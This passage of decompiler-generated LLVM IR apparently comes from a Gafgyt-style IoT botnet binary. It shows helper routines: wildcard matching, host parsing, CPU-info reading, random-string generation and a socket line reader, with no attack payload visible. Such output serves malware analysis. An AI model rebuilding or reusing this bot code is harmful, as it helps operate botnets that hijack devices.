  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp12, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp12, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp12, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp12, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.6 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.6, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_8048e37 ], [ %storemerge4, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f12 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f12, i32* %stack_var_-4, align 4
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  %v2_8048f3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v2_8048f3f = phi i32 [ %v2_8048f3f.pre, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v0_8048f12, %entry ]
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  store i32 %v2_8048f3f, i32* @ebp, align 4
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f5a = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059280.18, i32 0, i32 0), i32 0)
  %v2_80490ba = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490d224 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d725 = icmp eq i32 %v5_80490d224, 0
  %v1_80490d927 = icmp eq i1 %v1_80490d725, false
  br i1 %v1_80490d927, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_8048f67:                             ; preds = %entry, %dec_label_pc_8049099
  %v3_8048f70 = call i32 @uppercase(i8* %tmp22)
  %v5_8048f86 = call i32 @strstr(i32 %v2_80490ba, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805928e.19, i32 0, i32 0))
  %v12_8048f93 = icmp eq i32 %v5_8048f86, %v2_80490ba
  %v1_8048f95 = icmp eq i1 %v12_8048f93, false
  br i1 %v1_8048f95, label %dec_label_pc_8049099, label %dec_label_pc_8048f9b

dec_label_pc_8048f9b:                             ; preds = %dec_label_pc_8048f67
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fa9:                             ; preds = %dec_label_pc_8048fc0, %dec_label_pc_8048fb6, %dec_label_pc_8048fac
  %v5_8048fa9 = add i32 %v4_8048fac, 1
  %v22_8048fa9 = inttoptr i32 %v5_8048fa9 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fac:                             ; preds = %dec_label_pc_8048f9b, %dec_label_pc_8048fa9
  %storemerge4 = phi i8* [ %v22_8048fa9, %dec_label_pc_8048fa9 ], [ %tmp23, %dec_label_pc_8048f9b ]
  %v4_8048fac = ptrtoint i8* %storemerge4 to i32
  %v2_8048faf = load i8, i8* %storemerge4, align 1
  %v7_8048fb2 = icmp eq i8 %v2_8048faf, 32
  br i1 %v7_8048fb2, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048fac
  %v2_8048fb9 = load i8, i8* %storemerge4, align 1
  %v10_8048fbc = icmp eq i8 %v2_8048fb9, 9
  br i1 %v10_8048fbc, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fc0

dec_label_pc_8048fc0:                             ; preds = %dec_label_pc_8048fb6
  %v2_8048fc3 = load i8, i8* %storemerge4, align 1
  %v10_8048fc6 = icmp eq i8 %v2_8048fc3, 58
  br i1 %v10_8048fc6, label %dec_label_pc_8048fa9, label %dec_label_pc_8048ff1.preheader

dec_label_pc_8048ff1.preheader:                   ; preds = %dec_label_pc_8048fc0
  br label %dec_label_pc_8048ff1

dec_label_pc_8048fcc:                             ; preds = %dec_label_pc_804901a, %dec_label_pc_8048ff1
  %v3_8048fe3 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fea = add i32 %v4_8048fac, %v3_8048fe3
  %v1_8048fed = add i32 %v6_8048fea, -1
  %v1_8048fee = inttoptr i32 %v1_8048fed to i8*
  store i8 0, i8* %v1_8048fee, align 1
  br label %dec_label_pc_8048ff1

dec_label_pc_8048ff1:                             ; preds = %dec_label_pc_8048ff1.preheader, %dec_label_pc_8048fcc
  %v3_8049008 = call i32 @_strlen(i8* %storemerge4)
  %v6_804900f = add i32 %v4_8048fac, %v3_8049008
  %v1_8049012 = add i32 %v6_804900f, -1
  %v1_8049013 = inttoptr i32 %v1_8049012 to i8*
  %v2_8049013 = load i8, i8* %v1_8049013, align 1
  %v10_8049016 = icmp eq i8 %v2_8049013, 13
  br i1 %v10_8049016, label %dec_label_pc_8048fcc, label %dec_label_pc_804901a

dec_label_pc_804901a:                             ; preds = %dec_label_pc_8048ff1
  store i1 false, i1* @df, align 1
  store i32 %v4_8048fac, i32* @edi, align 4
  %v3_8049031 = call i32 @_strlen(i8* %storemerge4)
  %v6_8049038 = add i32 %v4_8048fac, %v3_8049031
  %v1_804903b = add i32 %v6_8049038, -1
  %v1_804903c = inttoptr i32 %v1_804903b to i8*
  %v2_804903c = load i8, i8* %v1_804903c, align 1
  %v10_804903f = icmp eq i8 %v2_804903c, 10
  br i1 %v10_804903f, label %dec_label_pc_8048fcc, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804901a
  %v5_8049051 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8049056 = icmp eq i32 %v5_8049051, 0
  br i1 %v1_8049056, label %dec_label_pc_8049070, label %dec_label_pc_804905a

dec_label_pc_804905a:                             ; preds = %dec_label_pc_8049043
  %v5_8049068 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8049068 = inttoptr i32 %v5_8049068 to i8*
  store i8 0, i8* %v6_8049068, align 1
  br label %dec_label_pc_8049070

dec_label_pc_8049070:                             ; preds = %dec_label_pc_8049043, %dec_label_pc_804905a
  store i32 %v4_8048fac, i32* @eax, align 4
  %v4_804907a = inttoptr i32 %arg1 to i8*
  %v5_804907d = call i32 @strcpy(i8* %v4_804907a, i32 %v4_8048fac)
  %v2_8049088 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_8049099:                             ; preds = %dec_label_pc_8048f67
  %v6_80490b5 = call i32 @__GI_memset(i8* %tmp22, i32 0, i32 4096)
  %v5_80490d2 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d7 = icmp eq i32 %v5_80490d2, 0
  %v1_80490d9 = icmp eq i1 %v1_80490d7, false
  br i1 %v1_80490d9, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_80490df:                             ; preds = %dec_label_pc_8049099, %entry
  %v2_80490e5 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_80490f4:                             ; preds = %dec_label_pc_8049070, %dec_label_pc_80490df
  %storemerge = phi i32 [ 1, %dec_label_pc_80490df ], [ 0, %dec_label_pc_8049070 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048fac, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490ba, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048f5a, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80490f4, { 1, 0 }
  uselistorder label %dec_label_pc_8049070, { 1, 0 }
  uselistorder label %dec_label_pc_8048ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8048fac, { 1, 0 }
  uselistorder label %dec_label_pc_8048f67, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049103 = load i32, i32* @ebp, align 4
  store i32 %v0_8049103, i32* %stack_var_-4, align 4
  %v4_8049103 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049103, i32* @ebp, align 4
  %v5_8049122 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059280.18, i32 0, i32 0), i32 0)
  %v2_8049180 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804919811 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d12 = icmp eq i32 %v5_804919811, 0
  %v1_804919f14 = icmp eq i1 %v1_804919d12, false
  br i1 %v1_804919f14, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_804912c:                             ; preds = %entry, %dec_label_pc_804915f
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804915f ], [ 0, %entry ]
  %v3_8049135 = call i32 @uppercase(i8* %tmp10)
  %v5_804914b = call i32 @strstr(i32 %v2_8049180, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805928e.19, i32 0, i32 0))
  %v12_8049158 = icmp eq i32 %v5_804914b, %v2_8049180
  %v1_804915a = icmp eq i1 %v12_8049158, false
  br i1 %v1_804915a, label %dec_label_pc_804915f, label %dec_label_pc_804915c

dec_label_pc_804915c:                             ; preds = %dec_label_pc_804912c
  %v4_804915c = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %dec_label_pc_804912c, %dec_label_pc_804915c
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_804912c ], [ %v4_804915c, %dec_label_pc_804915c ]
  %v6_804917b = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_8049198 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d = icmp eq i32 %v5_8049198, 0
  %v1_804919f = icmp eq i1 %v1_804919d, false
  br i1 %v1_804919f, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804915f, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804915f ]
  %v2_80491a7 = call i32 @__libc_close(i32 %v5_8049122)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049180, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8049122, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804915f, { 1, 0 }
  uselistorder label %dec_label_pc_804912c, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491b1 = load i32, i32* @ebp, align 4
  store i32 %v0_80491b1, i32* %stack_var_-4, align 4
  %v0_80491b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80491b4, i32* %stack_var_-8, align 4
  %v5_80491cd = ptrtoint i8* %arg1 to i32
  %v5_804921326 = icmp sgt i32 %arg2, 0
  br i1 %v5_804921326, label %dec_label_pc_80491c8, label %dec_label_pc_8049215

dec_label_pc_80491c8:                             ; preds = %entry, %dec_label_pc_80491c8
  %storemerge27 = phi i32 [ %v4_804920a, %dec_label_pc_80491c8 ], [ 0, %entry ]
  %v6_80491cd = add i32 %storemerge27, %v5_80491cd
  store i32 %v6_80491cd, i32* @ebx, align 4
  %v1_80491d0 = call i32 @rand_cmwc(i32 %storemerge27)
  %v2_80491e5 = udiv i32 %v1_80491d0, 26
  %tmp = mul i32 %v2_80491e5, -10
  %v2_80491fd = add i32 %v1_80491d0, %tmp
  %v14_80491fd = trunc i32 %v2_80491fd to i8
  %v2_8049206 = add i8 %v14_80491fd, 65
  %v2_8049208 = load i32, i32* @ebx, align 4
  %v3_8049208 = inttoptr i32 %v2_8049208 to i8*
  store i8 %v2_8049206, i8* %v3_8049208, align 1
  %v4_804920a = add nuw nsw i32 %storemerge27, 1
  %exitcond = icmp eq i32 %v4_804920a, %arg2
  br i1 %exitcond, label %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, label %dec_label_pc_80491c8

dec_label_pc_804920d.dec_label_pc_8049215_crit_edge: ; preds = %dec_label_pc_80491c8
  %v2_8049218.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8049219.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049215

dec_label_pc_8049215:                             ; preds = %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, %entry
  %v2_8049219 = phi i32 [ %v2_8049219.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b1, %entry ]
  %v2_8049218 = phi i32 [ %v2_8049218.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049218, i32* @ebx, align 4
  store i32 %v2_8049219, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804920a, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80491c8, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804921e = load i32, i32* @edi, align 4
  store i32 %v0_804921e, i32* %stack_var_-8, align 4
  %v4_8049228 = ptrtoint i8* %arg2 to i32
  %v1_8049230 = and i32 %v4_8049228, -256
  %v5_8049232 = call i8* @_memset(i8* %arg2, i32 %v1_8049230, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8049252 = ptrtoint i32* %stack_var_-168 to i32
  %tmp30 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049259 = call i8* @_memset(i8* %tmp30, i32 0, i32 32)
  %v2_8049266 = udiv i32 %arg1, 32
  %v1_804926c = urem i32 %arg1, 32
  %v0_804926f = load i32, i32* @ebp, align 4
  %v2_804926f = mul nuw nsw i32 %v2_8049266, 4
  %v3_804926f = add nsw i32 %v2_804926f, -164
  %v4_804926f = add i32 %v3_804926f, %v0_804926f
  %v5_804926f = inttoptr i32 %v4_804926f to i32*
  %v6_804926f = load i32, i32* %v5_804926f, align 4
  %v9_804926f = shl i32 1, %v1_804926c
  %v12_804926f = or i32 %v6_804926f, %v9_804926f
  store i32 %v12_804926f, i32* %v5_804926f, align 4
  %v1_804927a = add i32 %arg1, 1
  %v2_804927b = ptrtoint i32* %stack_var_-176 to i32
  %v7_80492a4 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp31 = icmp slt i32 %v7_80492a4, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br i1 %tmp32, label %dec_label_pc_804935b, label %dec_label_pc_8049351.preheader

dec_label_pc_8049351.preheader:                   ; preds = %entry
  %v7_804935544 = icmp sgt i32 %tmp9, 9
  br i1 %v7_804935544, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_804934e
  %stack_var_-36.045 = phi i32 [ %v4_804934e, %dec_label_pc_804934e ], [ %tmp9, %dec_label_pc_8049351.preheader ]
  %v0_80492bb = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_80492bb = ptrtoint i8* %v0_80492bb to i32
  %v4_80492cb = call i32 @HackerPrint(i32 %v1_80492bb, i32 ptrtoint ([5 x i8]* @global_var_8059297.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80492f5 = call i8* @_memset(i8* %tmp30, i32 0, i32 32)
  %v0_804930b = load i32, i32* @ebp, align 4
  %v4_804930b = add i32 %v3_804926f, %v0_804930b
  %v5_804930b = inttoptr i32 %v4_804930b to i32*
  %v6_804930b = load i32, i32* %v5_804930b, align 4
  %v12_804930b = or i32 %v6_804930b, %v9_804926f
  store i32 %v12_804930b, i32* %v5_804930b, align 4
  %v7_8049340 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp33 = icmp slt i32 %v7_8049340, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_804935b, label %dec_label_pc_804934e

dec_label_pc_804934e:                             ; preds = %dec_label_pc_80492bb
  %v4_804934e = add nsw i32 %stack_var_-36.045, 1
  %v7_8049355 = icmp sgt i32 %stack_var_-36.045, 8
  br i1 %v7_8049355, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_80492bb, %dec_label_pc_804934e, %entry
  %v2_804937f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80493c5

dec_label_pc_804936a:                             ; preds = %dec_label_pc_80493c5
  %v0_804936a = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804936a = ptrtoint i8* %v0_804936a to i32
  %v6_804938c = call i32 @__libc_recv(i32 %v1_804936a, i32 %v2_804937f, i32 1, i32 0)
  %v9_8049391 = icmp eq i32 %v6_804938c, 1
  br i1 %v9_8049391, label %dec_label_pc_80493a8, label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_804936a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493a8:                             ; preds = %dec_label_pc_804936a
  %v3_80493a8 = load i8, i8* %stack_var_-177, align 1
  %v4_80493af = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80493a8, i8* %stack_var_-32.0, align 1
  %v5_80493b4 = add i32 %v4_80493af, 1
  %v22_80493b4 = inttoptr i32 %v5_80493b4 to i8*
  %v3_80493b7 = load i8, i8* %stack_var_-177, align 1
  %v10_80493be = icmp eq i8 %v3_80493b7, 10
  br i1 %v10_80493be, label %dec_label_pc_80493d3, label %dec_label_pc_80493c2

dec_label_pc_80493c2:                             ; preds = %dec_label_pc_80493a8
  %v4_80493c2 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80493c5

dec_label_pc_80493c5:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_80493c2
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_804935b ], [ %v22_80493b4, %dec_label_pc_80493c2 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804935b ], [ %v4_80493c2, %dec_label_pc_80493c2 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_804935b ], [ %v4_80493c5, %dec_label_pc_80493c2 ]
  %v4_80493c5 = add i32 %stack_var_12.0, -1
  %v9_80493c5 = sub i32 0, %stack_var_12.0
  %v10_80493c5 = and i32 %stack_var_12.0, %v9_80493c5
  %v11_80493c5 = icmp slt i32 %v10_80493c5, 0
  %v12_80493c5 = icmp eq i32 %v4_80493c5, 0
  %v13_80493c5 = icmp slt i32 %v4_80493c5, 0
  %v3_80493c9 = icmp eq i1 %v13_80493c5, %v11_80493c5
  %v4_80493c9 = icmp eq i1 %v12_80493c5, false
  %v5_80493c9 = and i1 %v4_80493c9, %v3_80493c9
  %v4_80493cf = icmp eq i1 %v5_80493c9, false
  %v1_80493d1 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d1, label %dec_label_pc_804936a, label %dec_label_pc_80493d3

dec_label_pc_80493d3:                             ; preds = %dec_label_pc_80493a8, %dec_label_pc_80493c5
